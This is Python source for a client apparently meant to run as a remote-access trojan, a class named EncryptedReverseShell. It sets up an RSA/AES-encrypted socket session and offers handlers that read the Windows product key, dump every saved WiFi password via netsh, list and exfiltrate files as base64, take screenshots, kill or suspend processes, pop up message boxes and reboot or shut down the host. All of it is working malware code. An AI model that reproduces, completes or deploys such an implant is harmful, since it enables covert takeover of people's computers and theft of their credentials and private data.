import ctypes
import webbrowser
import winreg as wrg
import socket
import subprocess
import os
import platform
import threading
import winreg
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import base64
import json
import tempfile
import time
import sys
import locale
from datetime import datetime, timedelta
import psutil
from PIL import ImageGrab
import cv2
import tkinter as tk
from tkinter import messagebox
import requests

HOST = '127.0.0.1'

class EncryptedReverseShell:
    def __init__(self):
        self.sock = None
        self.aes_key = None
        self.session_id = get_random_bytes(16)
        self.connected = False
        self.last_heartbeat = time.time()
        self.command_lock = threading.Lock()
        self.heartbeat_interval = 30 

    def get_port(self):
        return int(datetime.now().strftime("%d%m"))
        
    def get_system_encoding(self):
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                codepage = kernel32.GetConsoleOutputCP()
                
                encoding_map = {
                    866: 'cp866',
                    1251: 'cp1251',
                    65001: 'utf-8',
                    437: 'cp437',
                }
                return encoding_map.get(codepage, 'cp866')
            else:
                return locale.getpreferredencoding() or 'utf-8'
        except:
            return 'utf-8'
    
    def generate_rsa_keys(self):
        key = RSA.generate(2048)
        return key, key.publickey()
    
    def aes_encrypt(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        elif isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False).encode('utf-8')
            
        cipher = AES.new(self.aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)
    
    def aes_decrypt(self, encrypted_data):
        try:
            encrypted_data = base64.b64decode(encrypted_data)
            nonce, tag, ciphertext = encrypted_data[:16], encrypted_data[16:32], encrypted_data[32:]
            
            cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            try:
                return json.loads(decrypted.decode('utf-8'))
            except:
                return decrypted.decode('utf-8')
        except Exception as e:
            return {"error": f"Decryption failed: {str(e)}"}
    
    def rsa_encrypt(self, public_key, data):
        cipher = PKCS1_OAEP.new(public_key)
        return base64.b64encode(cipher.encrypt(data))
    
    def rsa_decrypt(self, private_key, encrypted_data):
        cipher = PKCS1_OAEP.new(private_key)
        return cipher.decrypt(base64.b64decode(encrypted_data))
    
    def key_exchange(self):
        private_key, public_key = self.generate_rsa_keys()
        
        public_key_bytes = public_key.export_key()
        self.sock.send(str(len(public_key_bytes)).encode().ljust(16) + public_key_bytes)
        
        key_size = int(self.sock.recv(16).strip())
        encrypted_aes_key = self.sock.recv(key_size)
        
        self.aes_key = self.rsa_decrypt(private_key, encrypted_aes_key)
        
        self.send_encrypted({"type": "session", "status": "established", "session_id": self.session_id.hex()})
    
    def send_encrypted(self, data):
        with self.command_lock:
            try:
                if not self.sock:
                    return False
                    
                encrypted = self.aes_encrypt(data)
                self.sock.send(str(len(encrypted)).encode().ljust(16) + encrypted)
                self.last_heartbeat = time.time()
                return True
            except Exception as e:
                print(f"[-] Send failed: {e}")
                return False
    
    def recv_encrypted(self, timeout=30):
        with self.command_lock:
            try:
                if not self.sock:
                    return None
                    
                self.sock.settimeout(timeout)
                size_data = self.sock.recv(16)
                if not size_data:
                    return None
                    
                size = int(size_data.strip())
                encrypted_data = b""
                while len(encrypted_data) < size:
                    chunk = self.sock.recv(size - len(encrypted_data))
                    if not chunk:
                        return None
                    encrypted_data += chunk
                    
                self.last_heartbeat = time.time()
                return self.aes_decrypt(encrypted_data)
            except socket.timeout:
                return {"type": "heartbeat"}
            except Exception as e:
                print(f"[-] Receive failed: {e}")
                return None

    def send_heartbeat(self):
        try:
            return self.send_encrypted({"type": "heartbeat", "timestamp": time.time()})
        except:
            return False
        
    def is_admin(self):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            return False

    def get_product_key(self):
        key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "BackupProductKeyDefault"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        
        if key:
            wrg.CloseKey(key)

        return value

    def get_product_id(self):
        key_path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        value_name = "ProductID"
        try:
            value, value_type = winreg.QueryValueEx(key, value_name)
        except:
            if key:
                wrg.CloseKey(key)
            return 'Not Found'
        if key:
            wrg.CloseKey(key)
        return value
    
    def is_root(self):
        if os.getuid() == 0:
            return True
        else:
            return False

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=10).text
        except:
            return "Error of getting public ip!"
        
    def get_private_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "Error of getting private ip!"

    def list_printers(self):
        """Get list of available printers"""
        try:
            if platform.system() != "Windows":
                return {"error": "Printer listing is only supported on Windows"}
            
            printers = []
            
            # Method 1: Using wmic
            try:
                result = subprocess.run(
                    ['wmic', 'printer', 'get', 'Name,DeviceID,DriverName,PortName,Shared,Location,Status'],
                    capture_output=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    system_encoding = self.get_system_encoding()
                    try:
                        output = result.stdout.decode(system_encoding, errors='replace')
                    except:
                        output = result.stdout.decode('utf-8', errors='replace')
                    
                    lines = output.strip().split('\n')
                    if len(lines) > 1:
                        for line in lines[1:]:
                            line = line.strip()
                            if line:
                                parts = [p.strip() for p in line.split('  ') if p.strip()]
                                if len(parts) >= 4:
                                    printers.append({
                                        "name": parts[0],
                                        "device_id": parts[1] if len(parts) > 1 else "Unknown",
                                        "driver": parts[2] if len(parts) > 2 else "Unknown",
                                        "port": parts[3] if len(parts) > 3 else "Unknown",
                                        "shared": parts[4] if len(parts) > 4 else "Unknown",
                                        "location": parts[5] if len(parts) > 5 else "N/A",
                                        "status": parts[6] if len(parts) > 6 else "Unknown"
                                    })
            except Exception as e:
                pass
            
            # Method 2: If wmic failed, try using PowerShell
            if not printers:
                try:
                    ps_command = 'Get-Printer | Select-Object Name,DriverName,PortName,Shared,Location,PrinterStatus | ConvertTo-Json'
                    result = subprocess.run(
                        ['powershell', '-Command', ps_command],
                        capture_output=True,
                        timeout=15
                    )
                    
                    if result.returncode == 0:
                        printers_data = json.loads(result.stdout.decode('utf-8', errors='replace'))
                        
                        if isinstance(printers_data, dict):
                            printers_data = [printers_data]
                        
                        for printer in printers_data:
                            status_map = {
                                0: "Ready",
                                1: "Paused",
                                2: "Error",
                                3: "Pending Deletion",
                                4: "Paper Jam",
                                5: "Paper Out",
                                6: "Manual Feed",
                                7: "Paper Problem",
                                8: "Offline",
                                9: "IO Active",
                                10: "Busy",
                                11: "Printing",
                                12: "Output Bin Full",
                                13: "Not Available",
                                14: "Waiting",
                                15: "Processing",
                                16: "Initializing",
                                17: "Warming Up",
                                18: "Toner Low",
                                19: "No Toner",
                                20: "Page Punt",
                                21: "User Intervention",
                                22: "Out of Memory",
                                23: "Door Open",
                                24: "Server Unknown",
                                25: "Power Save"
                            }
                            
                            status_code = printer.get('PrinterStatus', 0)
                            status_text = status_map.get(status_code, f"Unknown ({status_code})")
                            
                            printers.append({
                                "name": printer.get('Name', 'Unknown'),
                                "device_id": "N/A",
                                "driver": printer.get('DriverName', 'Unknown'),
                                "port": printer.get('PortName', 'Unknown'),
                                "shared": "Yes" if printer.get('Shared', False) else "No",
                                "location": printer.get('Location', 'N/A'),
                                "status": status_text
                            })
                except:
                    pass
            
            if not printers:
                return {"error": "No printers found"}
            
            return {
                "printers": printers,
                "total_printers": len(printers)
            }
            
        except Exception as e:
            return {"error": f"Printer listing failed: {str(e)}"}

    def print_file(self, file_path, printer_name):
        """Print a file to specified printer"""
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            
            if not os.path.isfile(file_path):
                return {"error": f"Path is not a file: {file_path}"}
            
            system = platform.system()
            
            if system == "Windows":
                # Method 1: Try using notepad for text files
                file_ext = os.path.splitext(file_path)[1].lower()
                
                if file_ext in ['.txt', '.csv', '.log', '.xml', '.html', '.htm', '.py', '.js', '.css']:
                    try:
                        # Use notepad with /p flag for printing
                        command = f'notepad /p "{file_path}"'
                        if printer_name:
                            # Set as default printer first, then print
                            temp_set_default = f'rundll32 printui.dll,PrintUIEntry /y /n "{printer_name}"'
                            subprocess.run(temp_set_default, shell=True, capture_output=True, timeout=10)
                            time.sleep(1)
                        
                        result = subprocess.run(command, shell=True, capture_output=True, timeout=15)
                        
                        if result.returncode == 0:
                            return {
                                "success": True,
                                "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}'",
                                "file": file_path,
                                "printer": printer_name if printer_name else "default"
                            }
                    except:
                        pass
                
                # Method 2: Use PowerShell for any file type
                try:
                    if printer_name:
                        ps_command = f'''
                        $printer = "{printer_name}"
                        $file = "{file_path}"
                        Start-Process -FilePath $file -Verb Print -PassThru | Out-Null
                        '''
                    else:
                        ps_command = f'''
                        $file = "{file_path}"
                        Start-Process -FilePath $file -Verb Print -PassThru | Out-Null
                        '''
                    
                    result = subprocess.run(
                        ['powershell', '-Command', ps_command],
                        capture_output=True,
                        timeout=15
                    )
                    
                    if result.returncode == 0:
                        return {
                            "success": True,
                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via PowerShell",
                            "file": file_path,
                            "printer": printer_name if printer_name else "default"
                        }
                except Exception as e:
                    return {"error": f"PowerShell print failed: {str(e)}"}
                
                # Method 3: Use the 'print' command
                try:
                    if printer_name:
                        command = f'print /D:"{printer_name}" "{file_path}"'
                    else:
                        command = f'print "{file_path}"'
                    
                    result = subprocess.run(command, shell=True, capture_output=True, timeout=15)
                    
                    if result.returncode == 0:
                        return {
                            "success": True,
                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via print command",
                            "file": file_path,
                            "printer": printer_name if printer_name else "default"
                        }
                except:
                    pass
                
                return {"error": f"Failed to print file. Make sure the file type is supported and printer is available"}
                
            elif system == "Linux":
                # Linux printing using lp command
                try:
                    if printer_name:
                        command = ['lp', '-d', printer_name, file_path]
                    else:
                        command = ['lp', file_path]
                    
                    result = subprocess.run(command, capture_output=True, timeout=15)
                    
                    if result.returncode == 0:
                        return {
                            "success": True,
                            "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via lp",
                            "file": file_path,
                            "printer": printer_name if printer_name else "default"
                        }
                    else:
                        error_output = result.stderr.decode('utf-8', errors='replace')
                        return {"error": f"Print failed: {error_output}"}
                        
                except FileNotFoundError:
                    # Try alternative: lpr
                    try:
                        if printer_name:
                            command = ['lpr', '-P', printer_name, file_path]
                        else:
                            command = ['lpr', file_path]
                        
                        result = subprocess.run(command, capture_output=True, timeout=15)
                        
                        if result.returncode == 0:
                            return {
                                "success": True,
                                "message": f"File '{file_path}' sent to printer '{printer_name if printer_name else 'default'}' via lpr",
                                "file": file_path,
                                "printer": printer_name if printer_name else "default"
                            }
                        else:
                            return {"error": "Neither 'lp' nor 'lpr' commands are available. Install CUPS or lpr."}
                    except FileNotFoundError:
                        return {"error": "Printing utilities not found. Install CUPS with: sudo apt-get install cups"}
            else:
                return {"error": f"Unsupported platform for printing: {system}"}
                
        except Exception as e:
            return {"error": f"Print file failed: {str(e)}"}

    def get_local_time(self):
        """Get local time of client machine"""
        try:
            now = datetime.now()
            
            # Get timezone info
            import time
            timezone_name = time.tzname[0] if hasattr(time, 'tzname') else "Unknown"
            
            # Check if DST is in effect
            is_dst = time.localtime().tm_isdst > 0
            
            # Get UTC offset
            utc_offset = -time.timezone / 3600
            if is_dst:
                utc_offset = -time.altzone / 3600
            
            # Format various time representations
            local_time_info = {
                "datetime": now.strftime("%Y-%m-%d %H:%M:%S"),
                "date": now.strftime("%Y-%m-%d"),
                "time": now.strftime("%H:%M:%S"),
                "time_12h": now.strftime("%I:%M:%S %p"),
                "day_of_week": now.strftime("%A"),
                "day_of_year": now.strftime("%j"),
                "week_number": now.strftime("%W"),
                "month": now.strftime("%B"),
                "year": now.strftime("%Y"),
                "timestamp": now.timestamp(),
                "timezone": timezone_name,
                "utc_offset_hours": utc_offset,
                "is_dst": is_dst,
                "iso_format": now.isoformat(),
                "unix_timestamp": int(now.timestamp())
            }
            
            # Add system-specific time info
            if platform.system() == "Windows":
                try:
                    # Get additional Windows time info
                    result = subprocess.run(
                        ['wmic', 'os', 'get', 'LastBootUpTime,LocalDateTime'],
                        capture_output=True,
                        timeout=5
                    )
                    
                    if result.returncode == 0:
                        output = result.stdout.decode('utf-8', errors='replace')
                        for line in output.split('\n'):
                            if line.strip() and '.' in line:
                                # Parse LocalDateTime format: 20240101120000.500000+060
                                parts = line.split('.')
                                if len(parts) >= 2:
                                    datetime_str = parts[0]
                                    if len(datetime_str) >= 14:
                                        boot_time = datetime.strptime(datetime_str[:14], "%Y%m%d%H%M%S")
                                        local_time_info["last_boot"] = boot_time.strftime("%Y-%m-%d %H:%M:%S")
                                        
                                        # Calculate uptime
                                        boot_timestamp = boot_time.timestamp()
                                        uptime_seconds = now.timestamp() - boot_timestamp
                                        uptime_days = int(uptime_seconds // 86400)
                                        uptime_hours = int((uptime_seconds % 86400) // 3600)
                                        uptime_minutes = int((uptime_seconds % 3600) // 60)
                                        
                                        local_time_info["uptime"] = f"{uptime_days} days, {uptime_hours} hours, {uptime_minutes} minutes"
                                        local_time_info["uptime_seconds"] = int(uptime_seconds)
                                    break
                except:
                    pass
            
            return {
                "local_time": local_time_info
            }
            
        except Exception as e:
            return {"error": f"Failed to get local time: {str(e)}"}

    def get_system_info(self):
        info = {
            "system": platform.system(),
            "node": platform.node(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "username": os.getenv('USERNAME') or os.getenv('USER'),
            "current_dir": os.getcwd(),
            "encoding": self.get_system_encoding(),
            "public_ip": self.get_public_ip(),
            "private_ip": self.get_private_ip(),
        }

        if platform.system() == 'Windows':
            info['is_admin'] = self.is_admin()
            info['product_id'] = self.get_product_id()
            info['product_key'] = self.get_product_key()
        else:
            info['is_root'] = self.is_root()
        
        try:
            info["cpu_cores"] = psutil.cpu_count()
            info["memory_total"] = round(psutil.virtual_memory().total / (1024**3), 2)
            info["memory_used"] = round(psutil.virtual_memory().used / (1024**3), 2)
            info["disk_usage"] = {}
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info["disk_usage"][partition.device] = {
                        "total": round(usage.total / (1024**3), 2),
                        "used": round(usage.used / (1024**3), 2),
                        "free": round(usage.free / (1024**3), 2)
                    }
                except:
                    continue
        except Exception as e:
            info["psutil_error"] = str(e)
        
        return info
    
    def show_messagebox(self, title="Message", message="", msg_type="info"):
        try:
            if not message:
                return {"error": "No message provided"}
            
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            if msg_type.lower() == "error":
                messagebox.showerror(title, message)
            elif msg_type.lower() == "warning":
                messagebox.showwarning(title, message)
            elif msg_type.lower() == "yesno":
                result = messagebox.askyesno(title, message)
                root.destroy()
                return {
                    "success": True,
                    "message": f"Message box displayed",
                    "title": title,
                    "content": message,
                    "type": msg_type,
                    "response": "Yes" if result else "No"
                }
            elif msg_type.lower() == "okcancel":
                result = messagebox.askokcancel(title, message)
                root.destroy()
                return {
                    "success": True,
                    "message": f"Message box displayed",
                    "title": title,
                    "content": message,
                    "type": msg_type,
                    "response": "OK" if result else "Cancel"
                }
            else:
                messagebox.showinfo(title, message)
            
            root.destroy()
            
            return {
                "success": True,
                "message": f"Message box displayed with title: '{title}'",
                "title": title,
                "content": message,
                "type": msg_type
            }
        except Exception as e:
            return {"error": f"Error showing message box: {str(e)}"}

    def get_battery_info(self):
        try:
            if platform.system() != "Windows":
                return {"error": "Battery info is only available on Windows"}
            
            battery = psutil.sensors_battery()
            if battery is None:
                return {"error": "No battery found"}

            try:
                result = subprocess.run(['wmic', 'path', 'Win32_Battery', 'get', 'BatteryStatus,EstimatedChargeRemaining,EstimatedRunTime,Status,Name'], 
                                      capture_output=True, text=True, timeout=10)
                wmi_info = result.stdout.strip()
            except:
                wmi_info = "WMI info not available"
            
            battery_info = {
                "percent": battery.percent,
                "power_plugged": battery.power_plugged,
                "charging": battery.power_plugged,
                "status": "Charging" if battery.power_plugged else "Discharging",
                "seconds_left": battery.secsleft if battery.secsleft != -1 else "Unknown",
                "time_left": str(timedelta(seconds=battery.secsleft)) if battery.secsleft > 0 else "Unknown",
                "wmi_details": wmi_info
            }
            
            return {"battery_info": battery_info}
            
        except Exception as e:
            return {"error": f"Battery info failed: {str(e)}"}

    def reboot_system(self):
        try:
            system = platform.system()
            
            if system == "Windows":
                subprocess.run(['shutdown', '/r', '/t', '5', '/c', 'System reboot initiated'], 
                             capture_output=True)
                return {"output": "System will reboot in 5 seconds"}
                
            elif system == "Linux":
                try:
                    subprocess.run(['systemctl', 'reboot'], capture_output=True)
                except:
                    try:
                        subprocess.run(['reboot'], capture_output=True)
                    except:
                        subprocess.run(['sudo', 'reboot'], capture_output=True)
                
                return {"output": "Reboot command sent"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Reboot failed: {str(e)}"}

    def shutdown_system(self):
        try:
            system = platform.system()
            
            if system == "Windows":
                subprocess.run(['shutdown', '/s', '/t', '5', '/c', 'System shutdown initiated'], 
                             capture_output=True)
                return {"output": "System will shutdown in 5 seconds"}
                
            elif system == "Linux":
                try:
                    subprocess.run(['systemctl', 'poweroff'], capture_output=True)
                except:
                    try:
                        subprocess.run(['shutdown', '-h', 'now'], capture_output=True)
                    except:
                        subprocess.run(['sudo', 'shutdown', '-h', 'now'], capture_output=True)
                
                return {"output": "Shutdown command sent"}
            else:
                return {"error": f"Unsupported platform: {system}"}
                
        except Exception as e:
            return {"error": f"Shutdown failed: {str(e)}"}

    def get_wifi_passwords(self):
        try:
            if platform.system() != "Windows":
                return {"error": "WiFi password extraction is only supported on Windows"}
            
            system_encoding = self.get_system_encoding()
            
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, timeout=10)
            
            if result.returncode != 0:
                return {"error": "Failed to get WiFi profiles"}
            
            try:
                output = result.stdout.decode(system_encoding, errors='replace')
            except:
                output = result.stdout.decode('utf-8', errors='replace')
            
            profiles = []
            for line in output.split('\n'):
                if any(indicator in line for indicator in [
                    "All User Profile",
                    "Все профили пользователей",
                    "Profil tous les utilisateurs",
                    "Profil für alle Benutzer"
                ]):
                    if ":" in line:
                        profile = line.split(":", 1)[1].strip()
                        if profile:
                            profiles.append(profile)
            
            if not profiles:
                for line in output.split('\n'):
                    line = line.strip()
                    if line and not line.startswith('Profiles') and not line.startswith('Профили'):
                        if ':' in line:
                            potential_profile = line.split(':', 1)[1].strip()
                            if potential_profile and len(potential_profile) > 1:
                                verify = subprocess.run(
                                    ['netsh', 'wlan', 'show', 'profile', potential_profile],
                                    capture_output=True,
                                    timeout=5
                                )
                                if verify.returncode == 0:
                                    profiles.append(potential_profile)
            
            if not profiles:
                return {"error": "No WiFi profiles found"}
            
            wifi_passwords = []
            for profile in profiles:
                try:
                    pwd_result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True,
                        timeout=10
                    )
                    
                    if pwd_result.returncode == 0:
                        pwd_output = None
                        for encoding in [system_encoding, 'utf-8', 'cp866', 'cp1251', 'windows-1251', 'latin-1']:
                            try:
                                pwd_output = pwd_result.stdout.decode(encoding, errors='replace')
                                if 'Key Content' in pwd_output or 'Содержимое ключа' in pwd_output or 'Security key' in pwd_output:
                                    break
                            except:
                                continue
                        
                        if pwd_output is None:
                            try:
                                pwd_output = pwd_result.stdout.decode('utf-8', errors='ignore')
                            except:
                                pwd_output = pwd_result.stdout.decode('latin-1', errors='ignore')
                        
                        password = "No password/Open network"
                        
                        key_indicators = [
                            "Key Content",
                            "Содержимое ключа", 
                            "Schlüsselinhalt",
                            "Contenu de la clé",
                            "Contenido de la clave",
                            "Contenuto chiave"
                        ]
                        
                        for line in pwd_output.split('\n'):
                            line_stripped = line.strip()
                            for indicator in key_indicators:
                                if indicator in line_stripped:
                                    if ":" in line_stripped:
                                        password = line_stripped.split(":", 1)[1].strip()
                                        break
                            if password != "No password/Open network":
                                break
                        
                        security_indicators = [
                            "Security key",
                            "Ключ безопасности",
                            "Clé de sécurité",
                            "Sicherheitsschlüssel"
                        ]
                        
                        has_security = False
                        for line in pwd_output.split('\n'):
                            for indicator in security_indicators:
                                if indicator in line and ("present" in line.lower() or "присутствует" in line.lower()):
                                    has_security = True
                                    break
                            if has_security:
                                break
                        
                        if not has_security and password == "No password/Open network":
                            password = "Open network (no password)"
                        
                        wifi_passwords.append({
                            "ssid": profile,
                            "password": password
                        })
                    else:
                        wifi_passwords.append({
                            "ssid": profile,
                            "password": "Error retrieving password"
                        })
                        
                except Exception as e:
                    wifi_passwords.append({
                        "ssid": profile,
                        "password": f"Error: {str(e)}"
                    })
            
            if not wifi_passwords:
                return {"error": "No WiFi networks found or unable to extract passwords"}
            
            return {
                "wifi_passwords": wifi_passwords,
                "total_networks": len(wifi_passwords)
            }
            
        except Exception as e:
            return {"error": f"WiFi password extraction failed: {str(e)}"}

    def get_current_directory(self):
        """Get current working directory"""
        try:
            current_dir = os.getcwd()
            return {
                "current_directory": current_dir,
                "exists": os.path.exists(current_dir),
                "is_directory": os.path.isdir(current_dir)
            }
        except Exception as e:
            return {"error": f"Failed to get current directory: {str(e)}"}

    def ls_directory(self, path=None):
        try:
            if path is None:
                path = os.getcwd()
            
            if not os.path.exists(path):
                return {"error": f"Directory not found: {path}"}
            
            if not os.path.isdir(path):
                return {"error": f"Not a directory: {path}"}
            
            items = []
            
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    mode = stat.st_mode
                    
                    if os.path.isdir(item_path):
                        file_type = 'd'
                    else:
                        file_type = '-'
                    
                    owner_perm = (
                        ('r' if mode & 0o400 else '-') +
                        ('w' if mode & 0o200 else '-') +
                        ('x' if mode & 0o100 else '-')
                    )
                    group_perm = (
                        ('r' if mode & 0o040 else '-') +
                        ('w' if mode & 0o020 else '-') +
                        ('x' if mode & 0o010 else '-')
                    )
                    other_perm = (
                        ('r' if mode & 0o004 else '-') +
                        ('w' if mode & 0o002 else '-') +
                        ('x' if mode & 0o001 else '-')
                    )
                    
                    permissions = file_type + owner_perm + group_perm + other_perm
                    n_links = stat.st_nlink
                    
                    if platform.system() == "Windows":
                        owner = os.getenv('USERNAME', str(stat.st_uid))
                        group = owner
                    else:
                        try:
                            import pwd
                            owner = pwd.getpwuid(stat.st_uid).pw_name
                        except:
                            owner = str(stat.st_uid)
                        
                        try:
                            import grp
                            group = grp.getgrgid(stat.st_gid).gr_name
                        except:
                            group = str(stat.st_gid)
                    
                    size = stat.st_size
                    mtime = datetime.fromtimestamp(stat.st_mtime)
                    mtime_str = mtime.strftime("%b %d %H:%M")
                    
                    name = item
                    if os.path.isdir(item_path):
                        name += '/'
                    
                    items.append({
                        "permissions": permissions,
                        "n_links": n_links,
                        "owner": owner,
                        "group": group,
                        "size": size,
                        "mtime": mtime_str,
                        "name": name,
                        "is_dir": os.path.isdir(item_path)
                    })
                    
                except Exception as e:
                    items.append({
                        "permissions": "??????????",
                        "n_links": "?",
                        "owner": "?",
                        "group": "?",
                        "size": "?",
                        "mtime": "?",
                        "name": item,
                        "is_dir": False,
                        "error": str(e)
                    })
            
            items.sort(key=lambda x: (not x.get('is_dir', False), x['name'].lower()))
            
            total_blocks = 0
            for item in items:
                if not item.get('error'):
                    try:
                        item_path = os.path.join(path, item['name'].rstrip('/'))
                        stat = os.stat(item_path)
                        if hasattr(stat, 'st_blocks'):
                            total_blocks += stat.st_blocks
                        else:
                            total_blocks += (stat.st_size + 511) // 512
                    except:
                        pass
            
            return {
                "directory": path,
                "items": items,
                "total": len(items),
                "total_blocks": total_blocks
            }
        except Exception as e:
            return {"error": f"Failed to list directory: {str(e)}"}

    def cat_file(self, file_path):
        try:
            if not os.path.exists(file_path):
                return {"error": f"File not found: {file_path}"}
            
            if not os.path.isfile(file_path):
                return {"error": f"Not a file: {file_path}"}
            
            file_size = os.path.getsize(file_path)
            if file_size > 5 * 1024 * 1024:
                return {"error": f"File too large to display (max 5MB): {file_size} bytes"}
            
            system_encoding = self.get_system_encoding()
            
            with open(file_path, 'rb') as f:
                raw_data = f.read()
            
            is_binary = b'\x00' in raw_data[:1000]
            
            if is_binary:
                return {
                    "file_name": os.path.basename(file_path),
                    "file_path": file_path,
                    "file_size": file_size,
                    "encoding": "base64 (binary file)",
                    "content": base64.b64encode(raw_data).decode('utf-8'),
                    "is_binary": True
                }
            
            encodings_to_try = []
            
            if system_encoding not in encodings_to_try:
                encodings_to_try.append(system_encoding)
            
            additional_encodings = [
                'utf-8',
                'cp1251',      # Windows Cyrillic
                'windows-1251', # Windows Cyrillic
                'cp866',       # DOS Cyrillic
                'koi8-r',      # Russian KOI8-R
                'iso-8859-5',  # ISO Cyrillic
                'latin-1',
                'cp1252'       # Windows Western
            ]
            
            for enc in additional_encodings:
                if enc not in encodings_to_try:
                    encodings_to_try.append(enc)
            
            best_result = None
            best_encoding = None
            
            for encoding in encodings_to_try:
                try:
                    decoded = raw_data.decode(encoding)
                    
                    has_cyrillic = any(
                        'А' <= char <= 'я' or char in 'Ёё' 
                        for char in decoded
                    )
                    
                    if has_cyrillic and encoding != 'utf-8':
                        try:
                            raw_data.decode('utf-8')
                            best_result = raw_data.decode('utf-8')
                            best_encoding = 'utf-8'
                            break
                        except:
                            pass
                    
                    if best_result is None or (has_cyrillic and best_encoding != 'utf-8'):
                        best_result = decoded
                        best_encoding = encoding
                        
                        if has_cyrillic:
                            break
                            
                except (UnicodeDecodeError, UnicodeError):
                    continue
            
            if best_result is not None:
                return {
                    "file_name": os.path.basename(file_path),
                    "file_path": file_path,
                    "file_size": file_size,
                    "encoding": best_encoding,
                    "content": best_result,
                    "is_binary": False
                }
            
            return {
                "file_name": os.path.basename(file_path),
                "file_path": file_path,
                "file_size": file_size,
                "encoding": "base64 (unknown encoding)",
                "content": base64.b64encode(raw_data).decode('utf-8'),
                "is_binary": True
            }
            
        except Exception as e:
            return {"error": f"Failed to read file: {str(e)}"}

    def suspend_process(self, process_identifier):
        try:
            target_pid = None
            process_name = None
            
            if isinstance(process_identifier, str) and process_identifier.isdigit():
                target_pid = int(process_identifier)
            else:
                if isinstance(process_identifier, str):
                    process_name = process_identifier
                    if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
                        process_name += '.exe'
                else:
                    return {"error": "Invalid process identifier"}
            
            suspended_processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'status']):
                try:
                    if target_pid is not None and proc.info['pid'] == target_pid:
                        process = psutil.Process(proc.info['pid'])
                        process.suspend()
                        suspended_processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "action": "suspended"
                        })
                        break
                    elif process_name is not None and proc.info['name'].lower() == process_name.lower():
                        process = psutil.Process(proc.info['pid'])
                        process.suspend()
                        suspended_processes.append({
                            "pid": proc.info['pid'],
                            "name": proc.info['name'],
                            "action": "suspended"
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    continue
            
            if suspended_processes:
                return {
                    "suspended_processes": suspended_processes,
                    "total_suspended": len(suspended_processes)
                }
            else:
                return {"error": f"No matching processes found for: {process_identifier}"}
                
        except Exception as e:
            return {"error": f"Process suspension failed: {str(e)}"}
        
    def open_page(self, url):
        try:
            if not url:
                return {"error": "No URL provided"}
            
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            
            webbrowser.open_new_tab(url)
            return {
                "success": True,
                "message": f"Opened {url} in browser",
                "url": url
            }
        except Exception as e:
            return {"error": f"Error opening URL: {str(e)}"}

    def kill_process(self, process_identifier):
        try:
            target_pid = None
            process_name = None
            
            if isinstance(process_identifier, str) and process_identifier.isdigit():
                target_pid = int(process_identifier)
            else:
                if isinstance(process_identifier, str):
                    process_name = process_identifier
                    if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
                        process_name += '.exe'
                else:
                    return {"error": "Invalid process identifier"}
            
            killed_processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'status']):
                try:
                    if target_pid is not None and proc.info['pid'] == target_pid:
                        process = psutil.Process(proc.info['pid'])
                        process_name_result = proc.info['name']
                        process.kill()
                        killed_processes.append({
                            "pid": proc.info['pid'],
                            "name": process_name_result,
                            "action": "killed"
                        })
                        break
                    elif process_name is not None and proc.info['name'].lower() == process_name.lower():
                        process = psutil.Process(proc.info['pid'])
                        process_name_result = proc.info['name']
                        process.kill()
                        killed_processes.append({
                            "pid": proc.info['pid'],
                            "name": process_name_result,
                            "action": "killed"
                        })
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    continue
            
            if killed_processes:
                return {
                    "killed_processes": killed_processes,
                    "total_killed": len(killed_processes)
                }
            else:
                return {"error": f"No matching processes found for: {process_identifier}"}
                
        except Exception as e:
            return {"error": f"Process termination failed: {str(e)}"}

    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                screenshot.save(tmp.name, 'PNG')
                with open(tmp.name, 'rb') as f:
                    screenshot_data = f.read()
            os.unlink(tmp.name)
            
            return {
                "screenshot": base64.b64encode(screenshot_data).decode('utf-8'),
                "size": len(screenshot_data)
            }
        except Exception as e:
            return {"error": f"Screenshot failed: {str(e)}"}

